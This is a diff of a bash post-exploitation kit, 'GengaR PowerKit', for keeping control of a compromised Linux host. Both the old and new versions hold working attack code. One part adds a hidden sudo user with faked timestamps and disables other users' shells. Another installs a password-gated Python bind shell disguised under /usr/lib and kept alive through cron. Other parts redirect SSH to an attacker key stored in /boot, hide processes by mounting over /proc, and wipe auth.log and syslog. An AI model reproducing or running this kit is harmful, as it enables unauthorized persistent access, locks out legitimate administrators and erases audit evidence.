@@ -1,128 +1,282 @@
-#!/bin/bash
+#!/usr/bin/env bash
+
 mv ./gpk /bin/gpk 2>/dev/null
-touch -t 201801120000 /bin/gpk
+touch -t 201801120000 /bin/gpk 2>/dev/null
 
-red='\033[33;31m'
-green='\033[33;32m'
-blue='\033[33;34m'
-white='\033[1;37m'
-purple='\033[1;35m'
+    red='\033[33;31m'
+    green='\033[33;32m'
+    blue='\033[33;34m'
+    white='\033[1;37m'
+    purple='\033[1;35m'
 
-echo -ne "$purple
+echo -e "
+$purple
+          ╔════════════════════════════════════════════════════════════════╗
+          ║        ________                           __________           ║
+          ║       /  _____/  ____   ____    _________ \______   \          ║ 
+          ║      /   \  ____/ __ \ /    \  / ___\__  \ |       _/          ║
+          ║      \    \_\  \  ___/|   |  \/ /_/  > __ \|    |   \          ║
+          ║       \______  /\___  >___|  /\___  (____  /____|_  /          ║
+          ║              \/     \/     \//_____/     \/       \/           ║
+          ║    __________                             ____  __.__  __      ║
+          ║    \______   \__  _  ______   ___________|    |/ _|__|/  |_    ║
+          ║     |     ___/\ \/ \/ /    \_/ __ \_  __ \      < |  \   __\   ║
+          ║     |    |     \     /   |  \  ___/|  | \/    |  \|  ||  |     ║
+          ║     |____|      \/\_/|___|  /\___  >__|  |____|__ \__||__|     ║
+          ║                           \/     \/              \/            ║
+          ║                            By H0ru                             ║
+          ║                                                                ║
+          ╚════════════════════════════════════════════════════════════════╝
+"
 
-      ╔════════════════════════════════════════════════════════════════╗
-      ║        ________                           __________           ║
-      ║       /  _____/  ____   ____    _________ \______   \          ║ 
-      ║      /   \  ____/ __ \ /    \  / ___\__  \ |       _/          ║
-      ║      \    \_\  \  ___/|   |  \/ /_/  > __ \|    |   \          ║
-      ║       \______  /\___  >___|  /\___  (____  /____|_  /          ║
-      ║              \/     \/     \//_____/     \/       \/           ║
-      ║    __________                             ____  __.__  __      ║
-      ║    \______   \__  _  ______   ___________|    |/ _|__|/  |_    ║
-      ║     |     ___/\ \/ \/ /    \_/ __ \_  __ \      < |  \   __\   ║
-      ║     |    |     \     /   |  \  ___/|  | \/    |  \|  ||  |     ║
-      ║     |____|      \/\_/|___|  /\___  >__|  |____|__ \__||__|     ║
-      ║                           \/     \/              \/            ║
-      ║                            By H0ru                             ║
-      ║                                                                ║
-      ╚════════════════════════════════════════════════════════════════╝
-      
-\n"
 
-echo -ne "$white"
- 
-PS3='MODE: '
-type=(
-"PWN"
-"CHECKER"
-"SSH CONFIG"
-"SSH KEYS"
-"RESET SSH"
-"HARDENING"
-"BACKDOOR"
-"HIDE"
-"CLEAR"
-"EXIT"
-)
-select var in "${type[@]}"; do
- case $var in
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
+         clear
 
-"PWN")
+    testpython=$(command -v python3 >/dev/null 2>&1 && echo -e "$green Installed!" || echo -e "$red Not Installed!")
 
-#NoBASH+PWN:
-            sed -i '/root/!s/bash/false/g' /etc/passwd
-
-            name=backups
-            echo -e "[+] User: backups"
-            read -p "[+] Password: " password
-            echo -ne "$password\n$password\n\n\n\n" | adduser $name 2>/dev/null
-            echo -ne "\n$name   ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
-            rm -rf /var/backups 2>/dev/null
-            mv /home/backups /var/backups
-            sed -i 's/:\/home\/backups:/:\/var\/backups:/g' /etc/passwd
-            shred -fuz /var/backups/.bash_history 2>/dev/null
-            ln -s /dev/null /var/backups/.bash_history
-            touch -t 201912250000 /var/backups/
-            mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2,gid=backups /proc
-
-            echo "[Pwned!]" 
-            echo -e "$white"          
-     ;;
-"CHECKER")
-
-#DATE:
-echo -ne "$red"
-echo "[+] DATE INFO:" 
-echo -ne "$white"
-     date 2>/dev/null
-
-#Tools:
-echo -ne "$green   
-    ╔═════════════════════╗
-    ║   TOOLS PREVIEW:    ║ 
-    ╚═════════════════════╝
-\n"
-
-echo -ne "$white"
-  which chattr curl wget python python2 python2.7 python3 python3.7 docker does sudo socat sshd service systemctl systemd nc ncat netcat gcc g++ make pkexec tmux   
+    echo -e "$blue
+    ┌──────────────────────────────────────────┐
+    │         Python3 checker to GPK           │
+    ├────────────────────┬─────────────────────┘
+    │       Status:      │    [$testpython$blue ]
+    └────────────────────┘   
+    "
    
-#General:
-echo -ne "$green   
-    ╔═══════════════════════╗
-    ║    GENERAL PREVIEW:   ║
-    ╚═══════════════════════╝
-\n"
+    test_python=$(command -v python3 >/dev/null 2>&1 && echo -e "$Installed!" || echo -e "Not Installed!")
 
-echo -ne "$blue"
-        echo "[+] Partitions:"
-        echo -e "$white"          
-        (df -h || lsblk)
-echo "                                    "
-echo -ne "$blue"
-        echo "[+] Crontab:"
-        echo -e "$white"          
-        cat /etc/crontab
-echo "                                    "
-echo -ne "$blue"
-        echo "[+] Shell Users:"
-        echo -e "$white"          
-        cat /etc/passwd | grep "sh$"
-echo "                                    "
-echo -ne "$blue"
-        echo "[+] Super Users:"
-        echo -e "$white"          
-        awk -F: '($3 == "0") {print}' /etc/passwd
-echo "                                    "        
-echo -ne "$blue"
-        echo "[+] SSH Keys:"
-        echo -e "$white"          
-        find / -name authorized_keys 2> /dev/null
-        find / -name id_rsa 2> /dev/null        
-        echo -e "$white"        
-     ;;
-"SSH CONFIG")
+    test "$test_python" = "Not Installed!" && echo -e "$white" && exit
+
+
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
+         clear
+
+
+echo -e "$purple
+  ⠀⠀⠀⠀⠀⢸⠓⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  ⠀⠀⠀⠀⠀⢸⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   
+  ⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠙⢤⡷⣤⣦⣀⠤⠖⠚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀   
+  ⣠⡿⠢⢄⡀⠀⡇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠸⠷⣶⠂⠀⠀⠀⣀⣀⠀⠀⠀   
+  ⢸⣃⠀⠀⠉⠳⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⢉⡭⠋     
+  ⠀⠘⣆⠀⠀⠀⠁⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀ [~] H3ll0 $(whoami)!  
+  ⠀⠀⠘⣦⠆⠀⠀⢀⡎⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⣠⠔⠋⠀⠀⠀⠀ [~] Y0ur p0w3r: $(id | cut -d ' ' -f1 | cut -d '=' -f2)
+  ⠀⠀⠀⡏⠀⠀⣆⠘⣄⠸⢧⠀⠀⠀⠀⢀⣠⠖⢻⠀⠀⠀⣿⢥⣄⣀⣀⣀⠀⠀ [~] L3t'$ g0 pwn?
+  ⠀⠀⢸⠁⠀⠀⡏⢣⣌⠙⠚⠀⠀⠠⣖⡛⠀⣠⠏⠀⠀⠀⠇⠀⠀⠀⠀⢙⣣⠄ 
+  ⠀⠀⢸⡀⠀⠀⠳⡞⠈⢻⠶⠤⣄⣀⣈⣉⣉⣡⡔⠀⠀⢀⠀⠀⣀⡤⠖⠚⠀⠀   
+  ⠀⠀⡼⣇⠀⠀⠀⠙⠦⣞⡀⠀⢀⡏⠀⢸⣣⠞⠀⠀⠀⡼⠚⠋⠁⠀⠀⠀⠀⠀   
+  ⠀⢰⡇⠙⠀⠀⠀⠀⠀⠀⠉⠙⠚⠒⠚⠉⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀
+  ⠀⠀⢧⡀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  ⠀⠀⠀⠙⣶⣶⣿⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  ⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⢿⣳⠞⠳⡄⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠹⣄⣀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+
 echo -e "$white"
+
+PS3="MODE: "
+type=(
+"INFO"
+"PWN"
+"BACKDOOR"
+"SSH CONFIG" 
+"SSH KEYS" 
+"RESTART SSH" 
+"HARDENING" 
+"CLEAR" 
+"EXIT" 
+)
+ select var in "${type[@]}"; do
+  case $var in
+
+"INFO")
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
+
+    #Info:
+    echo -e "
+
+    ┌──────────────────────────────────────────┐
+    │              Informations:               │
+    └──────────────────────────────────────────┘
+
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+   $green [+] SystemInfo:
+   $white $(uname -mrs; cat /etc/*release)
+
+
+   $green [+] About me:
+   $white $(id || (whoami && groups) 2>/dev/null)
+
+
+   $green [+] Path:
+   $white $PATH
+
+
+   $green [+] Sudo:
+   $white $(sudo -V| head -n1)
+
+
+   $green [+] Super Users:
+   $white $(awk -F: '($3 == "0") {print}' /etc/passwd)
+
+
+   $green [+] Shell Users:
+   $white $(cat /etc/passwd | grep "sh$")
+
+
+   $green [+] Partitions:
+   $white $(df -h || lsblk)
+
+
+   $green [+] Crontab:
+   $white $(cat /etc/crontab)
+
+
+   $green [+] Tools find: $white"
+which chattr curl wget perl php python python2 python2.7 python3 python3.6 python3.7 docker lxc doas sudo socat sshd service systemctl systemd nc ncat netcat nmap gcc g++ make pkexec tmux xterm aws kubectl
+                ;;
+ "PWN")
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
+
+         echo -e "$white"
+
+    #NoBASH+PWN:
+                sed -i "/root/!s/bash/false/g" /etc/passwd
+                name=backups
+                echo -e "$white [+] User: backups"
+                read -p " [+] Password: " password
+                echo -ne "$password\n$password\n\n\n\n" | adduser $name 2>/dev/null
+                echo -ne "\n$name   ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
+                rm -rf /var/backups 2>/dev/null
+                mv /home/backups /var/backups
+                sed -i 's/:\/home\/backups:/:\/var\/backups:/g' /etc/passwd
+                shred -fuz /var/backups/.bash_history 2>/dev/null
+                ln -s /dev/null /var/backups/.bash_history
+                touch -t 201912250000 /var/backups/
+                echo "[Backup User Created!]"
+                ;;
+ 
+ "BACKDOOR")
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
+
+         echo -e "$white"
+
+    #BACKDOOR:
+cat << 'EOF' > /usr/lib/networker
+#!/usr/bin/env python3
+import socket
+import os
+import subprocess
+import traceback
+import threading
+from socket import error as SocketError
+import errno
+LOCALHOST = '0.0.0.0' 
+PORT = DOOR
+banner = (b"""
+          NETWORK SYSTEM
+""")
+class ClientThread(threading.Thread):
+    def __init__(self,clientAddress,clientsocket):
+        threading.Thread.__init__(self)
+        self.csocket = clientsocket
+    def run(self):
+        while True:
+            self.csocket.send(banner)
+            while True:
+                data = self.csocket.recv(1024)
+                if data.decode() == "PASSWORD\n":
+                    self.csocket.send(b"Right!\n")
+                    while True:
+                        data = self.csocket.recv(1024)
+                        self.csocket.send(b"Command: " + data)
+                        command = data.decode()
+                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+                        output = proc.stdout.read()
+                        self.csocket.send(bytes(output))
+                else:
+                    self.csocket.send(b"Error!\n")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((LOCALHOST, PORT))
+while True:
+    s.listen(1000)
+    clientsock, clientAddress = s.accept()
+    newthread = ClientThread(clientAddress, clientsock)
+    newthread.start()
+EOF
+
+
+read -p "Your listening port: " DOOR
+
+
+sed -i "s/DOOR/$DOOR/" /usr/lib/networker
+
+
+read -p "Your password: " PASSWORD
+
+
+sed -i "s/PASSWORD/$PASSWORD/" /usr/lib/networker
+
+
+python3 -m py_compile /usr/lib/networker
+
+
+mv /usr/lib/__pycache__ /usr/lib/networks
+
+
+mv /usr/lib/networks/networkercpython* /usr/lib/networks/networker.proc
+
+
+rm /usr/lib/networker
+
+
+cat << 'EOF' > /etc/security/system.conf
+#!/usr/bin/env bash
+while :
+do
+    /usr/bin/python3 /usr/lib/networks/networker.proc
+    sleep 5
+done
+EOF
+
+
+chmod u+x /etc/security/system.conf
+
+
+echo "* * * * * root  /usr/bin/env bash /etc/security/system.conf" >> /etc/crontab        
+
+          echo -e "$white[Opened!]" 
+               ;;
+"SSH CONFIG")
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
+
 #SSHCONFIG:
+
+           echo -e "$white"
+
            sed -i 's/^.Port.*/Port 59639/' /etc/ssh/sshd_config;
 
            sed -i 's/Port.*/Port 59639/' /etc/ssh/sshd_config;
@@ -138,19 +292,7 @@ echo -e "$white"
            sed -i 's/^.PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config;
 
            sed -i 's/PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config;
-           
-           sed -i 's/^.PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config;
-           
-           sed -i 's/PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config;
-
-           sed -i 's/^.PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config;
-
-           sed -i 's/PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config;           
-
-           sed -i 's/^.PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;
-           
-           sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;
-           
+                      
            sed -i 's/^.ChallengeResponseAuthentication.*/ChallengeResponseAuthentication no/' /etc/ssh/sshd_config;
            
            sed -i 's/ChallengeResponseAuthentication.*/ChallengeResponseAuthentication no/' /etc/ssh/sshd_config; 
@@ -159,23 +301,23 @@ echo -e "$white"
 
            sed -i 's/UsePAM.*/UsePAM no/' /etc/ssh/sshd_config; 
            
-           sed -i 's/^.AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;
-           
-           sed -i 's/AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;
-           
-           echo "AuthenticationMethods publickey" >> /etc/ssh/sshd_config;
-
            echo "AllowUsers backups" >> /etc/ssh/sshd_config;
 
            echo "DenyUsers root" >> /etc/ssh/sshd_config;
            
-           echo "[SSH Configurated!]"           
-           echo -e "$white"
-     ;;
+           echo "[SSH Configurated!]"    
+               ;;
 "SSH KEYS")
-echo -e "$white"
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
+
 #MYSSHKEY:
           
+          echo -e "$white"
+
           echo "Creating SSH Directory:"
 
           read -p "[+] SSH-KEY:  " key
@@ -188,13 +330,36 @@ echo -e "$white"
           
           chmod 0600 /boot/model-generic
 
-          echo "[SSH Key Created!]"
-          
-          echo "[Finished!]"          
-          echo -e "$white"
-     ;;
-"RESET SSH")
-echo -e "$white"
+          echo "AuthenticationMethods publickey" >> /etc/ssh/sshd_config;
+
+          sed -i 's/^.AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;
+           
+          sed -i 's/AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;
+
+          sed -i 's/^.PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;
+           
+          sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;
+
+          sed -i 's/^.PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config;
+           
+          sed -i 's/PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config;
+
+          sed -i 's/^.PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config;
+
+          sed -i 's/PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config; 
+
+          echo "[SSH Key Configurated!]
+"  
+               ;;
+"RESTART SSH")
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
+
+         echo -e "$white"
+
 #RESTARTSSH:
             service ssh restart;
 
@@ -202,14 +367,20 @@ echo -e "$white"
 
             systemctl restart ssh.service;
 
-            echo "[SSH Reseted!]"
-            echo -e "$white"
-     ;;
+            echo "[SSH Restarted!]"
+               ;;
 "HARDENING")
-echo -e "$white"
-#SUDOERS:
+echo -e "$blue Proceed?
+      [?] y or ENTER to continue
+      [?] n to exit"
+         read -p " [y/n]: " ANSWER
+         test "$ANSWER" = "n" && echo -e "$white" && exit
 
-         touch -r /etc/timezone /etc/sudoers
+         echo -e "$white"
+
+         #SUDOERS:
+
+         touch -t 201910280000 /etc/sudoers
 
          chmod 400 /etc/sudoers
 
@@ -217,167 +388,43 @@ echo -e "$white"
 
          echo "[SUDOERS Locked!]"
 
-#PASSWD:
+         #PASSWD:
 
-        touch -r /etc/timezone /etc/passwd
+         touch -t 201910280000 /etc/passwd
 
-        chmod 400 /etc/passwd;
+         chmod 400 /etc/passwd;
 
-        chattr +i /etc/passwd;
+         chattr +i /etc/passwd;
  
-        echo "[PASSWD Locked!]"
+         echo "[PASSWD Locked!]"
 
-#NOEDITSSH:
+         #NOEDITSSH:
 
-           touch -t 201910280000 /boot/model-generic
+         touch -t 201910280000 /boot/model-generic
 
-           chmod 400 /etc/ssh/sshd_config;
+         chmod 400 /etc/ssh/sshd_config;
            
-           chattr +i /etc/ssh/sshd_config;
+         chattr +i /etc/ssh/sshd_config;
 
-           chattr +i /boot/model-generic
+         chattr +i /boot/model-generic
 
-           echo "[SSH Locked!]"
+         echo "[SSH Locked!]"
 
-           echo "[All Locked!]"
-           echo -e "$white"
-     ;;
-"BACKDOOR")
-#BACKDOOR:
-echo -e "$white"
-cat << 'EOF' > /usr/lib/networker
-#!/usr/bin/env python3
-import socket
-import os
-import subprocess
-import traceback
-import threading
-from socket import error as SocketError
-import errno
-
-LOCALHOST = '0.0.0.0' 
-PORT = #port
-banner = (b"""
-
-          NETWORK SYSTEM
-
-""")
-class ClientThread(threading.Thread):
-    def __init__(self,clientAddress,clientsocket):
-        threading.Thread.__init__(self)
-        self.csocket = clientsocket
-    def run(self):
-        while True:
-            self.csocket.send(banner)
-            while True:
-                data = self.csocket.recv(1024)
-                if data.decode() == "#password\n":
-                    self.csocket.send(b"Right!\n")
-                    while True:
-                        data = self.csocket.recv(1024)
-                        self.csocket.send(b"Command: " + data)
-                        command = data.decode()
-                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-                        output = proc.stdout.read()
-                        self.csocket.send(bytes(output))
-                else:
-                    self.csocket.send(b"Error!\n")
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((LOCALHOST, PORT))
-
-while True:
-    s.listen(1000)
-    clientsock, clientAddress = s.accept()
-    newthread = ClientThread(clientAddress, clientsock)
-    newthread.start()
-
-EOF
-
-python3 -m py_compile /usr/lib/networker
-
-mv /usr/lib/__pycache__ /usr/lib/System
-
-mv /usr/lib/System/networkercpython* /usr/lib/System/networker.proc
-
-rm /usr/lib/networker
-
-cat << 'EOF' > /etc/security/.system.conf
-#!/bin/bash
-
-while :
-do
-    exec -a syslogd /usr/bin/python3 /usr/lib/System/networker.proc
-    sleep 5
-done
-
-EOF
-
-chmod u+x /etc/security/.system.conf
-
-echo '* * * * * root /bin/bash /etc/security/.system.conf' > /etc/cron.d/security
-          
-          echo -ne "$white"
-          echo "[Opened!]" 
-     ;;
-"HIDE")
-
-#HIDDEN:
-bashps=$(ps|grep bash|awk '{print $1}')
-mytty=$(tty)
-bktty=$(ps aux | grep 'backups@pts' | grep -v grep | tr -s " " | cut -d " " -f2)
-sshd=$(ps aux | grep 'sshd: backups' | grep -v grep | grep -v pts| tr -s " " | cut -d " " -f2)
-
-echo -ne "$red    
-    "[*] My bash PID: $bashps"
-    "[*] My TTY: $mytty"
-    "[*] Backups TTY: $bktty"
-    "[*] Backups sshd: $sshd"
-    "[?] Trick: mount --bind /tmp /proc/pid"
-\n"
-
-        mount --bind /tmp /proc/$bashps
-        
-        echo -ne "$white"   
-        echo "[Hiddened!]" 
-     ;;
+         echo -e "[All Locked!]"
+               ;;
 "CLEAR")
-#CLEAR SCREEN:
-              clear
-echo -ne "$purple
-      ╔════════════════════════════════════════════════════════════════╗
-      ║        ________                           __________           ║ 
-      ║       /  _____/  ____   ____    _________ \______   \          ║ 
-      ║      /   \  ____/ __ \ /    \  / ___\__  \ |       _/          ║ 
-      ║      \    \_\  \  ___/|   |  \/ /_/  > __ \|    |   \          ║ 
-      ║       \______  /\___  >___|  /\___  (____  /____|_  /          ║
-      ║              \/     \/     \//_____/     \/       \/           ║
-      ║    __________                             ____  __.__  __      ║
-      ║    \______   \__  _  ______   ___________|    |/ _|__|/  |_    ║
-      ║     |     ___/\ \/ \/ /    \_/ __ \_  __ \      < |  \   __\   ║
-      ║     |    |     \     /   |  \  ___/|  | \/    |  \|  ||  |     ║
-      ║     |____|      \/\_/|___|  /\___  >__|  |____|__ \__||__|     ║
-      ║                           \/     \/              \/            ║
-      ║                            By H0ru                             ║
-      ║                                                                ║
-      ╚════════════════════════════════════════════════════════════════╝
-\n"
+        clear
+echo -e "$purple [?] PRESS ENTER"
 
-echo -ne "$white
-1) PWN       3) SSH CONFIG   5) RESET SSH    7) BACKDOOR     9) CLEAR
-2) CHECKER   4) SSH KEYS     6) HARDENING    8) HIDE        10) EXIT
-\n"
+echo -e "$white"
 
-     ;;     
+               ;;
 "EXIT")
-echo -ne "$white"
-#CLEAR HISTORY AND EXIT:
-    export HISTFILE=/dev/null
-    unset SSH_CONNECTION
-    unset SSH_CLIENT
+export HISTFILE=/dev/null
     cat /dev/null > /var/log/auth.log
     cat /dev/null > /var/log/syslog
-    exit
-     ;;
-   esac
+echo -e "$white"
+       exit
+               ;;
+    esac
 done
